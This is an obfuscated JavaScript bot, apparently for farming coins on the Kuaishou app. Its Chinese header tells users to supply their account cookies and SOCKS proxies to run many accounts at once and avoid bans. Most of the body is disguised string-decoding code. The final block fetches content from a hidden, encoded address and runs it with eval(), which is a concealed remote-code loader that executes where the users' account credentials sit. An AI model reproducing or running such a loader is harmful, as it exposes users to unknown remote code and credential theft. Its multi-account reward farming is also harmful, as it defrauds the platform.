//Thu Oct 30 2025 13:00:12 GMT+0000 (Coordinated Universal Time)
...
#Notice:
APP CK的版本最少要是13.5以上
变量名字:ksck 默认执行看广告版本 一次执行30次
开宝箱ck#salt#socks://用户名:密码@IP:端口 不写代理就是默认本地网络 报错503和脚本没关系
socks:// 或者 socks5://  哪个不报错写哪个
变量名字 kstask='look,food,box'
变量名字 kstaskNum=3  # 并发数，默认3个  多号必须设置代理 否则黑号不管
变量名字 ksmaxreward=300000  # 新增：单账号最大金币限制，达到后自动停止  默认30块钱最好不超过30w
变量名字 ksmaxtask=50  # 新增：每次运行的轮数
...
const fAHtuF = [0, 1, 8, 255, "length", "undefined", 63, 6, "fromCodePoint", 7, 12, "push", 91, 8191, 88, 13, 14];
function RJvtp5t(NwiyTF) {
  var NBW39d = "2jGr<bsDP]gWe7K*qolQ/?)xU9.43!&n^mI#Y[RHJ;fSVwvF_zC$}\"N,k{+ydB(i=:p1@>~508LX%E`O|MaZActuT6h",
    ...
    lR5A6GP,
    Z1aarJ4;
  cZDkGw(_JOzpI = "" + (NwiyTF || ""), Xn1qyj = _JOzpI.length, p0fErk9 = [], b9WNrPx = fAHtuF[0], i39XFE = fAHtuF[0], lR5A6GP = -fAHtuF[1]);
  for (Z1aarJ4 = fAHtuF[0]; Z1aarJ4 < Xn1qyj; Z1aarJ4++) {
    var RJvtp5t = NBW39d.indexOf(_JOzpI[Z1aarJ4]);
    if (RJvtp5t === -fAHtuF[1]) continue;
    if (lR5A6GP < fAHtuF[0]) {
      lR5A6GP = RJvtp5t;
    } else {
      cZDkGw(lR5A6GP += RJvtp5t * fAHtuF[12], b9WNrPx |= lR5A6GP << i39XFE, i39XFE += (lR5A6GP & fAHtuF[13]) > fAHtuF[14] ? fAHtuF[15] : fAHtuF[16]);
      do {
        cZDkGw(p0fErk9.push(b9WNrPx & fAHtuF[3]), b9WNrPx >>= fAHtuF[2], i39XFE -= fAHtuF[2]);
      } while (i39XFE > fAHtuF[9]);
      lR5A6GP = -fAHtuF[1];
    }
  }
  if (lR5A6GP > -fAHtuF[1]) {
    p0fErk9.push((b9WNrPx | lR5A6GP << i39XFE) & fAHtuF[3]);
  }
  return JbRrbS(p0fErk9);
}
function WdjQzK(_JOzpI) {
  if (typeof NwiyTF[_JOzpI] === fAHtuF[5]) {
...
function aKHHnW() {
  var NwiyTF = [function () {
    ...
    _JOzpI,
    Xn1qyj;
  cZDkGw(NBW39d = void 0, _JOzpI = []);
  try {
    cZDkGw(NBW39d = Object, _JOzpI[fAHtuF[11]]("".__proto__.constructor.name));
  } catch (p0fErk9) {}
  nfXESz: for (Xn1qyj = fAHtuF[0]; Xn1qyj < NwiyTF[fAHtuF[4]]; Xn1qyj++) try {
    var b9WNrPx;
    NBW39d = NwiyTF[Xn1qyj]();
    for (b9WNrPx = fAHtuF[0]; b9WNrPx < _JOzpI[fAHtuF[4]]; b9WNrPx++) if (typeof NBW39d[_JOzpI[b9WNrPx]] === fAHtuF[5]) continue nfXESz;
    return NBW39d;
  } catch (p0fErk9) {}
  return NBW39d || this;
}
cZDkGw(_JOzpI = aKHHnW() || {}, Xn1qyj = _JOzpI.TextDecoder, p0fErk9 = _JOzpI.Uint8Array, b9WNrPx = _JOzpI.Buffer, i39XFE = _JOzpI.String || String, lR5A6GP = _JOzpI.Array || Array, Z1aarJ4 = function () {
  var NwiyTF = new lR5A6GP(128),
    NBW39d,
    _JOzpI;
  cZDkGw(NBW39d = i39XFE[fAHtuF[8]] || i39XFE.fromCharCode, _JOzpI = []);
  return function (Xn1qyj) {
    var p0fErk9, b9WNrPx, lR5A6GP, Z1aarJ4;
    cZDkGw(b9WNrPx = void 0, lR5A6GP = Xn1qyj[fAHtuF[4]], _JOzpI[fAHtuF[4]] = fAHtuF[0]);
    for (Z1aarJ4 = fAHtuF[0]; Z1aarJ4 < lR5A6GP;) {
      cZDkGw(b9WNrPx = Xn1qyj[Z1aarJ4++], b9WNrPx <= 127 ? p0fErk9 = b9WNrPx : b9WNrPx <= 223 ? p0fErk9 = (b9WNrPx & 31) << fAHtuF[7] | Xn1qyj[Z1aarJ4++] & fAHtuF[6] : b9WNrPx <= 239 ? p0fErk9 = (b9WNrPx & 15) << fAHtuF[10] | (Xn1qyj[Z1aarJ4++] & fAHtuF[6]) << fAHtuF[7] | Xn1qyj[Z1aarJ4++] & fAHtuF[6] : i39XFE[fAHtuF[8]] ? p0fErk9 = (b9WNrPx & fAHtuF[9]) << 18 | (Xn1qyj[Z1aarJ4++] & fAHtuF[6]) << fAHtuF[10] | (Xn1qyj[Z1aarJ4++] & fAHtuF[6]) << fAHtuF[7] | Xn1qyj[Z1aarJ4++] & fAHtuF[6] : (p0fErk9 = fAHtuF[6], Z1aarJ4 += 3), _JOzpI[fAHtuF[11]](NwiyTF[p0fErk9] || (NwiyTF[p0fErk9] = NBW39d(p0fErk9))));
    }
    return _JOzpI.join("");
  };
}());
function JbRrbS(NwiyTF) {
  return typeof Xn1qyj !== fAHtuF[5] && Xn1qyj ? new Xn1qyj().decode(new p0fErk9(NwiyTF)) : typeof b9WNrPx !== fAHtuF[5] && b9WNrPx ? b9WNrPx.from(NwiyTF).toString("utf-8") : Z1aarJ4(NwiyTF);
}
function uS5OnkS(_JOzpI, Xn1qyj = fAHtuF[1]) {
  function p0fErk9(_JOzpI) {
    var Xn1qyj = "H8KspTaLiFRqIYJQPmXkMdO9;2/U<6!cD>:h(y5*$EGu3?tvxBl1,wW}[n4j_S~^=]%@|{AgzC+VN#r&o`0Zf.\"b7e)",
      ...
      lR5A6GP,
      Z1aarJ4;
    cZDkGw(p0fErk9 = "" + (_JOzpI || ""), b9WNrPx = p0fErk9.length, NwiyTF = [], NBW39d = fAHtuF[0], i39XFE = fAHtuF[0], lR5A6GP = -fAHtuF[1]);
    for (Z1aarJ4 = fAHtuF[0]; Z1aarJ4 < b9WNrPx; Z1aarJ4++) {
      var RJvtp5t = Xn1qyj.indexOf(p0fErk9[Z1aarJ4]);
      if (RJvtp5t === -fAHtuF[1]) continue;
      if (lR5A6GP < fAHtuF[0]) {
        lR5A6GP = RJvtp5t;
      } else {
        cZDkGw(lR5A6GP += RJvtp5t * fAHtuF[12], NBW39d |= lR5A6GP << i39XFE, i39XFE += (lR5A6GP & fAHtuF[13]) > fAHtuF[14] ? fAHtuF[15] : fAHtuF[16]);
        do {
          cZDkGw(NwiyTF.push(NBW39d & fAHtuF[3]), NBW39d >>= fAHtuF[2], i39XFE -= fAHtuF[2]);
        } while (i39XFE > fAHtuF[9]);
        lR5A6GP = -fAHtuF[1];
      }
    }
    if (lR5A6GP > -fAHtuF[1]) {
      NwiyTF.push((NBW39d | lR5A6GP << i39XFE) & fAHtuF[3]);
    }
  ...
  Object[b9WNrPx(103)](_JOzpI, b9WNrPx(104), {
    [b9WNrPx(105)]: Xn1qyj,
    [b9WNrPx(106)]: !1
  });
  return _JOzpI;
...
!(async () => {
  ...
  function Xn1qyj(Xn1qyj) {
    if (typeof NwiyTF[Xn1qyj] === fAHtuF[5]) {
  ...
  let {
    [Xn1qyj(107)]: b9WNrPx
  } = await p0fErk9[Xn1qyj(108)](Xn1qyj(109), {
    [Xn1qyj(110)]: {
      [Xn1qyj(111)]: Xn1qyj(112)
    }
  });
  eval(b9WNrPx);
})();